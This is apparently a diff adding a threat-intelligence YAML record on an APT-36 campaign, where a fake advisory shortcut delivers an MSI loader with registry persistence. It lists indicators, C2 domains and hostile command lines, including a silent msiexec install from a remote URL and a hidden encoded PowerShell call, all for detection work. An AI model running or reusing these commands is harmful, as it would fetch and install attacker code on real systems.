@@ -1,0 +1,69 @@
+description: APT-36 uses a malicious shortcut file disguised as a government advisory
+  PDF to deliver an MSI payload that installs a .NET-based loader and establishes
+  registry-based persistence.
+attribution: APT-36
+malware_families:
+- NCERT-Whatsapp-Advisory
+- WinRAR
+TTPs:
+  processes:
+  - cmd.exe
+  - msiexec.exe
+  - ConsoleApp1.exe
+  - PcDirvs.exe
+  - mshta.exe
+  - powershell.exe
+  commandline:
+  - C:\\Windows\\System32\\cmd.exe /c msiexec.exe /q /i https[:]//aeroclubofindia[.]co[.]in/css/NCERT-Whatsapp-Advisory/winc
+  - cmd.exe /c start https://dns.wmiprovider.com
+  - powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand ...
+  powershell:
+  - '...'
+  scripting_engine:
+  - VBS
+  registry_keys:
+  - HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
+  - HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
+  - HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell
+    Folders
+  image_load:
+  - wininet.dll
+  network_connections:
+  - ConsoleApp1.exe, dns.wmiprovider.com, 80
+  - cmd.exe, dns.wmiprovider.com, 80
+  - powershell.exe, dns.wmiprovider.com, 443
+  file_activity:
+  - C:\\Users\\Public\\NCERT-Whatsapp-Advisory.pdf
+  - C:\\ProgramData\\PcDirvs\\pdf.dll
+  - C:\\ProgramData\\PcDirvs\\wininet.dll
+  - C:\\ProgramData\\PcDirvs\\PcDirvs.exe
+  - C:\\ProgramData\\PcDirvs\\PcDirvs.hta
+  - C:\\ProgramData\\PcDirvs.exe
+  - C:\\ProgramData\\PcDirvs.hta
+  - C:\\ProgramData\\pdt.an
+  - C:\\ProgramData\\wininet.dll
+  persistence:
+  - Creating an HTA file that uses embedded VBScript to register a malicious executable
+    in the Windows startup registry key
+  process_relations:
+  - cmd.exe->msiexec.exe->ConsoleApp1.exe->PcDirvs.exe
+IOCs:
+  hashes:
+  - bbcbce9a08d971a4bbcd9a0af3576f1e0aa0dad1b3cf281c139b7a8dd8147605
+  - aa5fe3b75d16022198f4c89d1cc6dff07bd654a3c34933a0764a9d100b4e6ca2
+  - 4dd9e2085297515825416415413eae1c9632392cb159ac70e459d0ebeb2dd49d
+  - e23ad0cc6633674103b725288fcc1fcb5995ba348bd760096d6d8ac0d019723c
+  - 580d6401775cd9dbd029893a97d0523315b7ccf70feaa9383bd1a67bf2016ab6
+  ip_addresses: []
+  domains:
+  - aeroclubofindia.co.in
+  - wmiprovider.com
+  - dns.wmiprovider.com
+  urls:
+  - https[:]//aeroclubofindia[.]co[.]in/css/NCERT-Whatsapp-Advisory/winc
+  - https://dns.wmiprovider.com
+authors:
+- CYFIRMA Research
+reference: https://www.cyfirma.com/research/apt36-lnk-based-malware-campaign-leveraging-msi-payload-delivery
+date_of_publication: December 19, 2025
+file_creation_date: December 19, 2025
